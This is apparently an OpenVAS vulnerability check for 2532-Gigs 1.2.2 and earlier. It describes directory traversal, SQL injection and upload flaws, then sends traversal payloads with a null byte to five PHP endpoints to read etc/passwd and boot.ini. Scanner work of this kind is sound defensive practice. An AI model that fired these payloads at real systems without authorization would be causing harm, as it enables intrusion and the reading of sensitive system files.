###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_2532gigs_mult_vuln_aug09.nasl 15 2013-10-27 12:49:54Z jan $
#
# 2532|Gigs Directory Traversal And SQL Injection Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause directory traversal or
  SQL injection attacks, and can execute arbitrary code when register_globals is
  enabled and magic_quotes_gpc is disabled.

  Impact level: System/Application";

tag_affected = "2532-Gigs version 1.2.2 and prior.";
tag_insight = "- Vulnerability exists in activateuser.php, manage_venues.php, mini_calendar.php,
    deleteuser.php, settings.php, and manage_gigs.php files when input passed
    to the 'language' parameter is not properly verified before being used to
    include files via a .. (dot dot).
  - Input passed to the 'username' and 'password' parameters in checkuser.php
    is not properly sanitised before being used in SQL queries.
  - Error in upload_flyer.php which can be exploited by uploading a file with an
    executable extension, then accessing it via a direct request to the file in
    flyers/.";
tag_solution = "No solution or patch is available as of 19th August, 2009. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.2532gigs.com/";
tag_summary = "This host is running 2532-Gigs and is prone to Directory Traversal and
  SQL Injection Vulnerabilities.";

if(description)
{
  script_id(800682);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-08-20 09:27:17 +0200 (Thu, 20 Aug 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2008-6901", "CVE-2008-6902", "CVE-2008-6907");
  script_bugtraq_id(32911, 32913);
  script_name("2532|Gigs Directory Traversal And SQL Injection Multiple Vulnerabilities");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/7511");
  script_xref(name : "URL" , value : "http://milw0rm.com/exploits/7510");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/26585");

  script_description(desc);
  script_summary("Check for the Version of 2532|Gigs");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_2532gigs_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

gigsPort = get_http_port(default:80);
if(!gigsPort){
  exit(0);
}

gigsVer = get_kb_item("www/" + gigsPort + "/2532|Gigs");
gigsVer = eregmatch(pattern:"^(.+) under (/.*)$", string:gigsVer);

if((gigsVer[2] != NULL) && (!safe_checks()))
{
  attack = make_list("/deleteuser.php?language=../../../../../../../../../../", 
                     "/settings.php?language=../../../../../../../../../../",
                     "/mini_calendar?language=../../../../../../../../../../",
                     "/manage_venues.php?language=../../../../../../../../../../",
                     "/manage_gigs.php?language=../../../../../../../../../../");

  foreach path (make_list("etc/passwd", "boot.ini"))
  {
    foreach exploit (attack)
    {
      sndReq = http_get(item:string(gigsVer[2], exploit, path, "%00"),
                        port:gigsPort);
      rcvRes = http_send_recv(port:gigsPort, data:sndReq);
      
      if(rcvRes =~ "root:x:0:[01]:.*" || rcvRes =~ "\[boot loader\]")
      {
        security_hole(gigsPort);
        exit(0);
      }
    }
  }
}

if(gigsVer[1] != NULL)
{
  if(version_is_less_equal(version:gigsVer[1], test_version:"1.2.2")){
    security_hole(gigsPort);
  }
}
